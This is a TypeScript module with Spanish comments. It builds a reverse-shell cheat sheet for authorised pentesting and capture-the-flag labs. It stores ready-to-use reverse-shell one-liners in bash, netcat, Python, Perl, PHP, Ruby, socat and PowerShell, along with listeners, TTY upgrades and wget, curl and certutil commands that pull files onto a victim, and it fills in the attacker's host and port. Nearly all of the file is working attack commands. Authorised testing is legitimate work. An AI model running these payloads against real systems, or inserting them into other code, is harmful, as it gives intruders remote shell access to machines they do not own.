// Modulo puro (sin imports con alias) para poder probarlo con node --test.
/**
 * Chuleta de payloads para laboratorios y bug bounty (HTB, OSCP, pentest
 * autorizado): reverse shells en varios lenguajes/sistemas, listeners, mejora
 * de TTY y transferencia de ficheros. Rastro SOLO rellena tu IP/puerto y te lo
 * deja listo para copiar; no ejecuta nada. Material de referencia equivalente
 * a las chuletas públicas (revshells, PayloadsAllTheThings). Úsalo solo sobre
 * objetivos con permiso.
 */
export type PayloadCat = "revshell" | "listener" | "upgrade" | "transfer";
export interface Payload { id: string; cat: PayloadCat; label: string; os: "linux" | "windows" | "any"; tpl: string }

/** {lhost} y {lport} = tu máquina de ataque; {port} = puerto de servicio http; {file} = fichero a servir/traer. */
export const PAYLOADS: Payload[] = [
  { id: "bash-tcp", cat: "revshell", label: "Bash /dev/tcp", os: "linux", tpl: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" },
  { id: "bash-5", cat: "revshell", label: "Bash 5 (sin >&)", os: "linux", tpl: "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" },
  { id: "sh-mkfifo", cat: "revshell", label: "sh + mkfifo (sin bash)", os: "linux", tpl: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f" },
  { id: "nc-e", cat: "revshell", label: "netcat -e", os: "linux", tpl: "nc {lhost} {lport} -e /bin/sh" },
  { id: "python3", cat: "revshell", label: "Python 3", os: "linux", tpl: "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'" },
  { id: "perl", cat: "revshell", label: "Perl", os: "linux", tpl: "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
  { id: "php", cat: "revshell", label: "PHP", os: "linux", tpl: "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
  { id: "ruby", cat: "revshell", label: "Ruby", os: "linux", tpl: "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
  { id: "socat", cat: "revshell", label: "socat (TTY completa)", os: "linux", tpl: "socat TCP:{lhost}:{lport} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane" },
  { id: "powershell", cat: "revshell", label: "PowerShell", os: "windows", tpl: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"" },
  { id: "nc-listen", cat: "listener", label: "netcat (escucha)", os: "any", tpl: "nc -lvnp {lport}" },
  { id: "rlwrap", cat: "listener", label: "rlwrap + nc (historial/flechas)", os: "any", tpl: "rlwrap nc -lvnp {lport}" },
  { id: "socat-listen", cat: "listener", label: "socat (recibe TTY completa)", os: "any", tpl: "socat file:`tty`,raw,echo=0 TCP-L:{lport}" },
  { id: "pty", cat: "upgrade", label: "TTY con Python", os: "linux", tpl: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # luego Ctrl-Z; stty raw -echo; fg; export TERM=xterm" },
  { id: "script", cat: "upgrade", label: "TTY con script", os: "linux", tpl: "script /dev/null -c bash" },
  { id: "http-serve", cat: "transfer", label: "Servir ficheros (tu máquina)", os: "any", tpl: "python3 -m http.server {port}" },
  { id: "wget", cat: "transfer", label: "Traer con wget (víctima Linux)", os: "linux", tpl: "wget http://{lhost}:{port}/{file} -O /tmp/{file}" },
  { id: "curl", cat: "transfer", label: "Traer con curl (víctima Linux)", os: "linux", tpl: "curl http://{lhost}:{port}/{file} -o /tmp/{file}" },
  { id: "certutil", cat: "transfer", label: "Traer con certutil (víctima Windows)", os: "windows", tpl: "certutil -urlcache -f http://{lhost}:{port}/{file} {file}" },
  { id: "pwsh-dl", cat: "transfer", label: "Traer con PowerShell", os: "windows", tpl: "powershell -c \"Invoke-WebRequest http://{lhost}:{port}/{file} -OutFile {file}\"" },
];

export interface PayloadVars { lhost?: string; lport?: string | number; port?: string | number; file?: string }

export function validLhost(h: string): boolean {
  const s = String(h || "").trim();
  return /^[a-z0-9.-]{1,255}$/i.test(s) || /^\d{1,3}(\.\d{1,3}){3}$/.test(s);
}
function portOk(p: unknown): boolean { const n = Number(p); return Number.isInteger(n) && n > 0 && n < 65536; }

/** Rellena una plantilla con tus datos. Lo que falte o sea inválido queda como marcador legible (LHOST, LPORT…). */
export function fillPayload(tpl: string, vars: PayloadVars = {}): string {
  const lhost = vars.lhost && validLhost(vars.lhost) ? vars.lhost.trim() : "LHOST";
  const lport = portOk(vars.lport) ? String(vars.lport) : "LPORT";
  const port = portOk(vars.port) ? String(vars.port) : "8000";
  const file = /^[a-z0-9._-]{1,64}$/i.test(String(vars.file || "")) ? String(vars.file) : "shell.sh";
  return tpl.replace(/\{lhost\}/g, lhost).replace(/\{lport\}/g, lport).replace(/\{port\}/g, port).replace(/\{file\}/g, file);
}

/** Lista de payloads rellenados (opcionalmente filtrada por categoría o sistema). */
export function buildPayloads(vars: PayloadVars = {}, opts: { cat?: PayloadCat; os?: "linux" | "windows" } = {}): Array<{ id: string; cat: PayloadCat; label: string; os: string; cmd: string }> {
  return PAYLOADS
    .filter((p) => (!opts.cat || p.cat === opts.cat) && (!opts.os || p.os === opts.os || p.os === "any"))
    .map((p) => ({ id: p.id, cat: p.cat, label: p.label, os: p.os, cmd: fillPayload(p.tpl, vars) }));
}

export const PAYLOAD_CATS: PayloadCat[] = ["revshell", "listener", "upgrade", "transfer"];
